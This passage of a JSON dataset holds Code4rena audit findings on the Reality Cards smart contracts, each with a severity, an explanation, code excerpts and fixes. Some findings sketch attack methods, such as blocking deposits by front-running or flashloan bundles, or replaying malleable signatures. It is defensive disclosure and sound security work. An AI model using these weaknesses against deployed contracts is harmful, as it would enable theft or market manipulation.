      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function tokenExists does only limited checks on the existence of cards.\nIt doesn't doublecheck that tokenIds[_card] != 0  \nThis is relevant because 0 is the default value of empty array elements. Although this isn't a problem in the current code, \nfuture changes might accidentally introduce vulnerabilities.\n\nAlso cards are only valid if they are below numberOfCards. This has led to vulnerabilities in previous versions of the contract\n(e.g. previous contest)\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L1139\nfunction tokenExists(uint256 _card) internal view returns (bool) {\n        return tokenIds[_card] != type(uint256).max;\n}\n\n## Tools Used\n\n## Recommended Mitigation Steps\nChange the function to something like the following:\n\nfunction tokenExists(uint256 _card) internal view returns (bool) {\n       if (_cardId >= numberOfCards) return false;\n       if (tokenIds[_card] == 0) return false;\n       return tokenIds[_card] != type(uint256).max;\n}",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/8",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "663",
      "title": "[L-08] RCFactory: Do multiplication instead of division for length checks",
      "impact": "LOW",
      "content": "## Handle\n\nhickuphh3\n\n\n## Vulnerability details\n\n### Impact\n\nSolidity division rounds down, so doing `M / 2 <= N` checks mean that `M` can be at most `2N + 1`.\n\nThis affects the following checks:\n\n```jsx\nrequire(\n\t(_tokenURIs.length / 2) <= cardLimit,\n\t\"Too many tokens to mint\"\n);\n\nrequire(\n  _cardAffiliateAddresses.length == 0 ||\n\t  _cardAffiliateAddresses.length == (_tokenURIs.length / 2),\n  \"Card Affiliate Length Error\"\n)\n```\n\nNote that with the current implementation, if `_tokenURIs` is of odd length, its last element will be  redundant, but market creation will not revert.\n\nThe stricter checks will partially mitigate `_tokenURIs` having odd length because `_cardAffiliateAddresses` is now required to be exactly twice that of `_tokenURIs`.\n\n### Recommended Mitigation Steps\n\nThese checks should be modified to \n\n```jsx\nrequire(\n\t_tokenURIs.length <= cardLimit * 2,\n\t\"Too many tokens to mint\"\n);\n\nrequire(\n  _cardAffiliateAddresses.length == 0 ||\n\t  _cardAffiliateAddresses.length * 2 == _tokenURIs.length,\n  \"Card Affiliate Length Error\"\n);\n```\n\nIn addition, consider adding a check for `_tokenURIs` to strictly be of even length.\n\n`require(_tokenURIs.length % 2 == 0, \"TokenURI Length Error\");`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/39",
      "tags": [],
      "finders": [
        "leastwood",
        "hickuphh3"
      ]
    },
    {
      "id": "662",
      "title": "[L-07] RCFactory: Solve stack too deep for getMarketInfo()",
      "impact": "LOW",
      "content": "## Handle\n\nhickuphh3\n\n\n## Vulnerability details\n\n### Impact\n\nThe `marketInfoResults` is a parameter used by `getMarketInfo()` to determine the length of results to return. As the `setMarketInfoResults()` comments state, \"(it) would be better to pass this as a parameter in getMarketInfo.. however we are limited because of stack too deep errors\".\n\nThis limitation can be overcome by defining the return array variables as the function output, as suggested below.\n\nThe need for `marketInfoResults` and its setter function is then made redundant, whilst making querying results of possibly varying lengths more convenient.\n\n### Recommended Mitigation Steps\n\n```jsx\nfunction getMarketInfo(\n  IRCMarket.Mode _mode,\n  uint256 _state,\n  uint256 _skipResults,\n  uint256 _numResults // equivalent of marketInfoResults\n)\n  external\n  view\n  returns (\n    address[] memory _marketAddresses,\n    string[] memory _ipfsHashes,\n    string[] memory _slugs,\n    uint256[] memory _potSizes\n\t)\n {\n\t  uint256 _marketIndex = marketAddresses[_mode].length;\n\t  \n\t  _marketAddresses = new address[](_numResults);\n\t  _ipfsHashes = new string[](_numResults);\n\t  _slugs = new string[](_numResults);\n\t  _potSizes = new uint256[](_numResults);\n\t\t...\n}\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/41",
      "tags": [],
      "finders": [
        "hickuphh3"
      ]
    },
    {
      "id": "661",
      "title": "[L-06] Test Coverage Improvements",
      "impact": "LOW",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\nAdequate test coverage and regular reporting is an essential process in ensuring the codebase works as intended. Insufficient code coverage may lead to unexpected issues and regressions arising due to changes in the underlying smart contract implementation.\n\n## Proof of Concept\n![](https://i.imgur.com/Seur7Fg.png)\n\nImage above showcases total test coverage of the target contracts.\n\n## Tools Used\n\n`npx hardhat coverage`\nhttps://hardhat.org/plugins/solidity-coverage.html\n\n## Recommended Mitigation Steps\n\nEnsure the coverage report produced via `npx hardhat coverage` covers all functions within Reality Card's smart contract suite.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/15",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "660",
      "title": "[L-05] External Call Made Before State Change",
      "impact": "LOW",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\nThere are a number of functions in `RCTreasury.sol` which make external calls to another contract before updating the underlying market balances. More specifically, these affected functions are `deposit()`, `sponsor()`, and `topupMarketBalance()`. As a result, these functions would be prone to reentrancy exploits. However, as `safeTransferFrom()` operates on a trusted ERC20 token (RealityCard's token), this issue is of low severity.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L385-L391\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L561-L563\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L459-L461\n\n## Tools Used\n\nManual code review\n\n## Recommended Mitigation Steps\n\nModify the aforementioned functions such that all state changes are made before a call to the ERC20 token using the `safeTransferFrom()` function.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/23",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "659",
      "title": "[L-04] Return Value is Not Validated",
      "impact": "LOW",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\nThe `circuitBreaker()` function in `RCMarket.sol` is utilised in the event an oracle never provides a response to a RealityCards question. The function makes an external call to the `RCOrderbook.sol` contract through the `closeMarket()` function. If for some reason the orderbook was unable to be closed, this would never be checked in the `circuitBreaker()` function.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L1215-L1223\n\n## Tools Used\n\nManual code review\n\n## Recommended Mitigation Steps\n\nEnsure this is intended behaviour, or otherwise validate the response of `orderbook.closeMarket()`. Another option would be to emit the result of the external call in the `LogStateChange` event, alongside the state change.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/24",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "658",
      "title": "[L-03] Direct usage of ecrecover allows signature malleability",
      "impact": "LOW",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nThe `verify` function of `NativeMetaTransaction` calls the Solidity `ecrecover` function directly to verify the given signature. However, the `ecrecover` EVM opcode allows for malleable (non-unique) signatures and thus is susceptible to replay attacks. Although a replay attack on this contract is not possible since each user's nonce is used only once, rejecting malleable signatures is considered a best practice.\n\n## Proof of Concept\n\nReferenced code:\n[NativeMetaTransaction.sol#L97](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/lib/NativeMetaTransaction.sol#L97)\n\n[SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117)\n[SWC-121: Missing Protection against Signature Replay Attacks](https://swcregistry.io/docs/SWC-121)\n\n## Recommended Mitigation Steps\n\nUse the `recover` function from [OpenZeppelin's ECDSA library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol) for signature verification.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/63",
      "tags": [],
      "finders": [
        "shw"
      ]
    },
    {
      "id": "657",
      "title": "[L-02] Return value of erc20.approve is unchecked",
      "impact": "LOW",
      "content": "## Handle\n\nshw\n\n\n## Vulnerability details\n\n## Impact\n\nThe `SafeERC20` library is used in the `RCTreasury` contract to handle the transfer of tokens that are not compliant with the ERC20 specification. However, in line 347, the `approve` function is used instead of the `safeApprove` function. Tokens not compliant with the ERC20 specification could return `false` from the `approve` function call to indicate the approval fails, while the calling contract would not notice the failure if the return value is not checked.\n\n## Proof of Concept\n\nReferenced code:\n[RCTreasury.sol#L347](https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L347)\n\n## Recommended Mitigation Steps\n\nUse the `safeApprove` function instead, which reverts the transaction with a proper error message when the return value of `approve` is `false`. A better approach is to use the `safeIncreaseAllowance` function, which mitigates the multiple withdrawal attack on ERC20 tokens.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/64",
      "tags": [],
      "finders": [
        "shw"
      ]
    },
    {
      "id": "656",
      "title": "[L-01] Can’t retrieve all data with getMarketInfo ",
      "impact": "LOW",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nThe function getMarketInfo of RCFactory only can give results back in the range 0...marketInfoResults \nSupplying _skipResults doesn't help, it then just skips the first _skipResults  records.\n\nAssume marketInfoResults == 10 and _skipResults == 20:\nThen no result will be given back because \"_resultNumber < marketInfoResults\" will never allow _resultNumber  to be bigger than 10\n\nNote: this is low risk because getMarketInfo is a backup function (although you maybe want the backup to function as expected)\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L227\n  function getMarketInfo( IRCMarket.Mode _mode, uint256 _state, uint256 _skipResults  )  external view\n        returns ( address[] memory, string[] memory, string[] memory, uint256[] memory ) {   \n        ..\n        uint256 _resultNumber = 0;\n       ..\n        while (_resultNumber < marketInfoResults && _marketIndex > 1) {\n           ...\n                if (_resultNumber < _skipResults) {\n                    _resultNumber++;\n                } else {\n                    _marketAddresses[_resultNumber] = _market;   // will never reach this part if _skipResults >= marketInfoResults \n                    ....\n                    _resultNumber++;\n                }\n            }\n        }\n        return (_marketAddresses, _ipfsHashes, _slugs, _potSizes);\n    }\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nUpdate the code to something like the following:\n    \n uint idx;\n while (idx < marketInfoResults && _marketIndex > 1) {\n            _marketIndex--;\n            address _market = marketAddresses[_mode][_marketIndex];\n            if (IRCMarket(_market).state() == IRCMarket.States(_state)) {\n                if (_resultNumber < _skipResults) {\n                    _resultNumber++;\n                } else {\n                    _marketAddresses[idx] = _market;\n                    _ipfsHashes[idx] = ipfsHash[_market];\n                    _slugs[idx] = addressToSlug[_market];\n                    _potSizes[idx] = IRCMarket(_market).totalRentCollected();\n                    idx++;\n                }\n            }\n        }",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/14",
      "tags": [],
      "finders": [
        "gpersoon",
        "hickuphh3  cmichel"
      ]
    },
    {
      "id": "654",
      "title": "[M-02] Parameter updates not propagated",
      "impact": "MEDIUM",
      "content": "_Submitted by gpersoon, also found by cmichel_\n\nThere are several functions to update parameters. However these parameters are only updated on the top level and not propagated to the other contracts. This could lead to various unpredictable results.\nExamples are:\n- `setNftHubAddress` of `RCFactory`\n- `setOrderbookAddress` of `RCFactory`\n- `setLeaderboardAddress` of `RCFactory`\n- `setMinRental` of `RCTreasury`\n\n```solidity\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCFactory.sol#L586\nfunction setNftHubAddress(IRCNftHubL2 _newAddress) external override onlyUberOwner {\n    require(address(_newAddress) != address(0), \"Must set Address\");\n    nfthub = _newAddress;\n}\n\nfunction setOrderbookAddress(IRCOrderbook _newOrderbook) external override {\n    require( treasury.checkPermission(TREASURY, msgSender()), \"Not approved\" );\n    orderbook = _newOrderbook;\n}\n\nfunction setLeaderboardAddress(IRCLeaderboard _newLeaderboard) external override {\n    require( treasury.checkPermission(TREASURY, msgSender()), \"Not approved\");\n    leaderboard = _newLeaderboard;\n}\n\n//https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L188\nfunction setMinRental(uint256 _newDivisor) public override onlyRole(OWNER) {\n    minRentalDayDivisor = _newDivisor;\n}\n```\n\nRecommend implementing a way to notify the underlying contracts of the updates.\n\n**[Splidge (Reality Cards) acknowledged](https://github.com/code-423n4/2021-08-realitycards-findings/issues/30#issuecomment-904726786):**\n > We have come to realise that it is very unlikely we will be able to change certain contracts once they are in-use, the exception being the market where a new reference could be deployed.\n> In practice we do use `setNftHubAddress` shortly after deploying new contracts, this is so that we can continue to use an existing NFT hub that has already been put through Matic Mintable Asset mapping, but changing this while a market is active would cause problems.\n> While we accept that changing these parameters on active contracts may be troublesome we will not be making changes at this time, partly because it's useful to be able to change these before the contracts are in use but also due to the potential risk of introducing new problems at this stage in the project.\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Reality Cards smart contract system. The issue is that when parameters are updated, the changes are only applied to the top level and not propagated to other contracts. This could lead to unexpected outcomes. As an example, the functions setNftHubAddress, setOrderbookAddress, setLeaderbookAddress, and setMinRental are all affected. The proof of concept is provided in the report.\n\nThe recommended mitigation step is to implement a way to notify the underlying contracts of the updates. This will ensure that the changes are applied to all contracts, avoiding any unexpected outcomes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/30",
      "tags": [],
      "finders": [
        "cmichel",
        "gpersoon"
      ]
    },
    {
      "id": "653",
      "title": "[M-01] Uninitialized Variable marketWhitelist in RCTreasury.sol",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\nThe variable, `marketWhitelist`, is never initialized in the contract `RCTreasury.sol`. As a result, the function `marketWhitelistCheck()`  does not perform a proper check on whitelisted users for a restricted market. Additionally, the function will always return `true`, even if a market wishes to restrict its users to a specific role. \n\n## Proof of Concept\n\nThe initial state variable is defined in the link below.\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L75\n\nThe state variable `marketWhitelist` is accessed in the function `RCTreasury.marketWhitelistCheck()` as per below.\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCTreasury.sol#L269-L281\n\nThe function `RCTreasury.marketWhitelistCheck()` is called in `RCMarket.newRental()` as seen below. The comment indicates that there should be some ability to restrict certain markets to specific whitelists, however, there are no methods in `RCTreasury` that allow a market creator to enable this functionality.\nhttps://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCMarket.sol#L758-L761\n\n## Tools Used\n\n`npx hardhat coverage`\n`slither`\nManual code review\n\n## Recommended Mitigation Steps\n\nEnsure this behaviour is intended. If this is not the case, consider adding a function that enables a market creator to restrict their market to a specific role by whitelisting users.",
      "summary": "\nThis bug report describes a vulnerability in the contract RCTreasury.sol, which is part of the 2021-08-realitycards project. The variable marketWhitelist is never initialized in the contract, resulting in the function marketWhitelistCheck() not performing a proper check on whitelisted users for a restricted market. This means the function will always return true, even if a market wishes to restrict its users to a specific role. The bug was discovered through a combination of tools such as npx hardhat coverage, slither, and manual code review. The recommended mitigation steps are to ensure this behavior is intended, and if not, consider adding a function that enables a market creator to restrict their market to a specific role by whitelisting users.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/18",
      "tags": [],
      "finders": [
        "0xsanson",
        "leastwood",
        "gpersoon",
        "hickuphh3  JMukesh"
      ]
    },
    {
      "id": "652",
      "title": "[H-02] UberOwner has too much power",
      "impact": "HIGH",
      "content": "## Handle\n\ntensors\n\n\n## Vulnerability details\n\n## Impact\nThe Uber Owner has too much power within the system. This makes the protocol closer to a centralized prediction market whose rules are determined by the Uber Owner.\n\n## Proof of Concept\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L293\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L321\nhttps://github.com/code-423n4/2021-08-realitycards/blob/39d711fdd762c32378abf50dc56ec51a21592917/contracts/RCTreasury.sol#L331\n\nThe above functions can be used by the Uber Owner to completely change the functionality of the system.\nThis goes well beyond simple setting new constants and fees, the Uber Owner can basically reprogram how the entire protocol works. Not to mention if the address falls into the wrong hands.\n\n## Recommended Mitigation Steps\nLimit the permission of the Uber Owner to something more manageable and trustable. If upgrades to underlying contracts are required they can be done through a proxy instead, in the standard way.",
      "summary": "\nThis bug report deals with the vulnerability of the Uber Owner having too much power within the system. This vulnerability can be seen in the functions found in the proof of concept section of the report. If the address falls into the wrong hands, the system can be completely reprogrammed. The recommended mitigation step is to limit the permission of the Uber Owner to something more manageable and trustable. If upgrades to underlying contracts are required, they can be done through a proxy instead, in the standard way.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/74",
      "tags": [],
      "finders": [
        "tensors"
      ]
    },
    {
      "id": "651",
      "title": "[H-01] findNewOwner edgecase",
      "impact": "HIGH",
      "content": "## Handle\n\ngpersoon\n\n\n## Vulnerability details\n\n## Impact\nIn the function findNewOwner of RCOrderbook, as loop is done which included the check  _loopCounter < maxDeletions\nAfterwards a check is done for  \"(_loopCounter != maxDeletions)\" to determine if the processing is finished.\nIf _loopCounter == maxDeletions then the conclusion is that it isn't finished yet.\n\nHowever there is the edgecase that the processing might just be finished at the same time as _loopCounter == maxDeletions.\n\nYou can see this the best if you assume maxDeletions==1, in that case it will never draw the conclusion it is finished.\nOf course having maxDeletions==1 is very unlikely in practice.\n\n## Proof of Concept\n// https://github.com/code-423n4/2021-08-realitycards/blob/main/contracts/RCOrderbook.sol#L549\n function findNewOwner(uint256 _card, uint256 _timeOwnershipChanged)  external  override  onlyMarkets  {\n...\n        // delete current owner\n        do {\n            _newPrice = _removeBidFromOrderbookIgnoreOwner( _head.next, _market, _card );\n            _loopCounter++;             // delete next bid if foreclosed\n        } while (    treasury.foreclosureTimeUser( _head.next, _newPrice,  _timeOwnershipChanged ) <  minimumTimeToOwnTo &&\n                _loopCounter < maxDeletions );\n\n        if (_loopCounter != maxDeletions) {   // the old owner is dead, long live the new owner\n            _newOwner = .... \n            ...\n        } else {\n            // we hit the limit, save the old owner, we'll try again next time\n           ...\n        }\n    }\n\n\n## Tools Used\n\n## Recommended Mitigation Steps\nUse a different way to determine that the processing is done. This could save some gas.\nNote: the additional check also costs gas, so you have the verify the end result.\n\nPerhaps in setDeletionLimit doublecheck that _deletionLimit > 1.",
      "summary": "\nThis bug report is about the function findNewOwner in the RCOrderbook. This function is used to determine a new owner of a card. The bug is caused by an edge case which can occur when _loopCounter is equal to maxDeletions. In this case, the conclusion that the processing is finished is not drawn, even though it might be. This can be seen when maxDeletions is set to 1. To mitigate this issue, it is recommended to use a different way to determine that the processing is done. Additionally, it is suggested to doublecheck that _deletionLimit is greater than 1 when setting the deletion limit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-08-realitycards",
      "github_link": "https://github.com/code-423n4/2021-08-realitycards-findings/issues/27",
      "tags": [],
      "finders": [
        "gpersoon"
      ]
    },
    {
      "id": "42236",
      "title": "[M-17] Function `foreclosureTimeUser` returns a shorter user's foreclosure time than expected",
      "impact": "MEDIUM",
      "content": "_Submitted by [shw](https://github.com/x9453)_\n\nThe function `foreclosureTimeUser` of `RCTreasury` underestimates the user's foreclosure time if the current time is not the user's last rent calculation time. The underestimation of the foreclosure time could cause wrong results when determining the new owner of the card.\n\nThe variable `timeLeftOfDeposit` at line 668 is calculated based on `depositAbleToWithdraw(_user)`, the user's deposit minus the rent from the last rent calculation to the current time. Thus, the variable `timeLeftOfDeposit` indicates the time left of deposit, starting from now. However, at line 672, the `foreclosureTimeWithoutNewCard` is calculated by `timeLeftOfDeposit` plus the user's last rent calculation time instead of the current time. As a result, the user's foreclosure time is reduced. From another perspective, the rent between the last rent calculation time and the current time is counted twice.\n\nRecommend changing `depositAbleToWithdraw(_user)` at line 669 to `user[_user].deposit`. Or, change `user[_user].lastRentCalc` at both line 672 and 678 to `block.timestamp`.\n\n**[Splidge (Reality Cards) confirmed and resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/171#issuecomment-865843473):**\n > phew, this was one to wrap your head around.\n> I went with the first recommended mitigation because I believe the second one could causes issues if the user had already foreclosed, `depositAbleToWithdraw` would return 0 and so `foreclosureTimeWithoutNewCard` would incorrectly show as `block.timestamp`. Fix implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/a160893b17633491c064a6bf05ced72df15390fd)\n>\n> Really nice spot this one. Many thanks for such an in-depth look into the maths.\n\n",
      "summary": "\nThis bug report is about a function called `foreclosureTimeUser` in a code called `RCTreasury`. The function is used to calculate the time it takes for a user to lose ownership of a card if they don't pay their rent. However, the function is not working correctly and it is underestimating the time for some users. This can cause problems when determining the new owner of the card. The issue is caused by a mistake in the code where the rent from the last calculation is counted twice, resulting in a shorter foreclosure time. To fix this, the code needs to be changed to use the correct variables for calculating the time left and the user's last rent calculation time. The bug has been confirmed and resolved by the developers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/171",
      "tags": [],
      "finders": []
    },
    {
      "id": "42235",
      "title": "[M-16] Deposits can be denied by abusing `maxContractBalance`",
      "impact": "MEDIUM",
      "content": "_Submitted by [cmichel](https://twitter.com/cmichelio)_\n\nThe treasury implements a max contract balance check in the `deposit` function:\n\n```solidity\nrequire(\n    (erc20.balanceOf(address(this)) + _amount) <= maxContractBalance,\n    \"Limit hit\"\n);\n```\nA whale can stop anyone from depositing by front-running a user's deposit with a deposit that pushes the contract balance to the `maxContractBalance` limit first. The user's deposit will then fail in the check. Afterwards, the whale can withdraw again.\n\n> This is not only restricted to whales, miners/users can do the same using same-block cross-transaction flashloans and submitting a `(attacker deposit, user deposit, attacker withdraw)` flashbundle to a miner. Possibilities like this will only become more prevalent in the future.\n\nAny users can be blocked from depositing which prevents them from renting cards.\nThis allows an attacker to manipulate the outcome of a market in their favor by strategically preventing other competitors to bid on their cards (causing forfeiture due to a low deposit balance).\n\nRecommend removing the contract limit or at least set the limit very high if it keeps happening.\n\n\n**[mcplums (Reality Cards) acknowledged](https://github.com/code-423n4/2021-06-realitycards-findings/issues/153#issuecomment-862967304):**\n > This is a good one- but I don't think we need to make any changes to the contract. We can use it as originally intended, then if it is exploited as above, we can switch to only setting the variable to 0 or maxuint256. So it just acts as a toggle on whether deposits are allowed.\n\n\n",
      "summary": "\nThis bug report discusses a potential issue with the treasury contract's `deposit` function. The contract currently has a limit on the maximum balance that can be deposited, but this can be exploited by a whale or other users to prevent others from depositing and renting cards. This can be done by front-running a user's deposit and pushing the contract balance to the limit, causing the user's deposit to fail. This can be used to manipulate the market in favor of the attacker. The report suggests removing the limit or setting it very high to prevent this from happening. The project team has acknowledged the issue and is considering a solution where the limit will only be removed if it is exploited. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/153",
      "tags": [],
      "finders": []
    },
    {
      "id": "42234",
      "title": "[M-15] Deposits don't work with fee-on transfer tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by [cmichel](https://twitter.com/cmichelio)_\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\n\nThe `deposit()` function will introduce unexpected balance inconsistencies when comparing internal asset records with external ERC20 token contracts.\n\nRecommend measuring the asset change right before and after the asset-transferring routines as a possible mitigation.\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/152#issuecomment-862970135):**\n > I think balancedBooks modifier should handle this?\n>\n> Of course it means we are unable to use such tokens, but that is ok\n\n**[Splidge (Reality Cards) disputed](https://github.com/code-423n4/2021-06-realitycards-findings/issues/152#issuecomment-863172608)\n > oh, trying the same one again..? 😁\n> https://github.com/code-423n4/2021-05-88mph-findings/issues/16\n>\n> I'll fight this one though, I'd argue that we are using ERC20 tokens and according to the ERC20 [spec](https://github.com/code-423n4/2021-05-88mph-findings/issues/16) for transferFrom:\n>\n> > Transfers `_value` amount of tokens from address `_from` to address `_to`\n>\n> A deflationary token therefore isn't compliant to ERC20 as it doesn't transfer the full `_value` and so it isn't what we are planning to use and not relevant here.\n\n**[dmvt (Judge) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/152#issuecomment-877676755):**\n > If you plan not to support these tokens it should be very clearly documented. Keep in mind that \"we don't support that\" still has massive impact on the users involved. See: imBTC / ERC777 on Uniswap v1. The issue is valid and should stand in the audit report, in part so that future users see it.\n\n",
      "summary": "\nThis bug report discusses an issue with ERC20 tokens that have customizations, specifically deflationary tokens that charge a fee for each transfer. The `deposit()` function is causing unexpected balance inconsistencies when compared to external ERC20 token contracts. The suggested mitigation is to measure the asset change before and after the transfer. There is also a discussion about whether or not these tokens should be supported, with one person arguing that they are not compliant with the ERC20 spec and therefore should not be used. The judge on the case states that if these tokens are not going to be supported, it should be clearly documented for users. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/152",
      "tags": [],
      "finders": []
    },
    {
      "id": "42233",
      "title": "[M-13] Wrong calculation on `_collectRentAction`",
      "impact": "MEDIUM",
      "content": "_Submitted by [a_dlamo](https://twitter.com/a_delamo)_\n\nThe method `_collectRentAction` contains the [following code](https://github.com/code-423n4/2021-06-realitycards-findings/issues/122#issue-922787380):\n\nin case 6, it is doing:\n```solidity\n_refundTime = block.timestamp - marketLockingTime;\n```\ninstead of:\n ```solidity\n _refundTime = _timeUserForeclosed - marketLockingTime;\n ```\nThis could lead to funds being drained by the miscalculation.\n\n**[mcplums (Reality Cards) commented](https://github.com/code-423n4/2021-06-realitycards-findings/issues/122#issuecomment-864032806):**\n > This is a really great find!!\n\n**[Splidge (Reality Cards) confirmed and resolved](https://github.com/code-423n4/2021-06-realitycards-findings/issues/122#issuecomment-865026713):**\n > Fix implemented [here](https://github.com/RealityCards/RealityCards-Contracts/commit/457cc782c196e34b3b9d95a2d2c7b52ee6c17f2d)\n\n\n",
      "summary": "\nThe bug report highlights an issue in the `_collectRentAction` method of the Reality Cards smart contract. The code in case 6 is incorrectly calculating the `_refundTime` variable, which could result in funds being drained. The team at Reality Cards has confirmed and resolved the issue, with the fix being implemented in a recent commit.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Reality Cards",
      "source_link": "https://code4rena.com/reports/2021-06-realitycards",
      "github_link": "https://github.com/code-423n4/2021-06-realitycards-findings/issues/122",
      "tags": [],
      "finders": []
    },
    {
      "id": "42232",
      "title": "[M-12] `RCNftHubL2.safeTransferFrom` not according to spec",
      "impact": "MEDIUM",
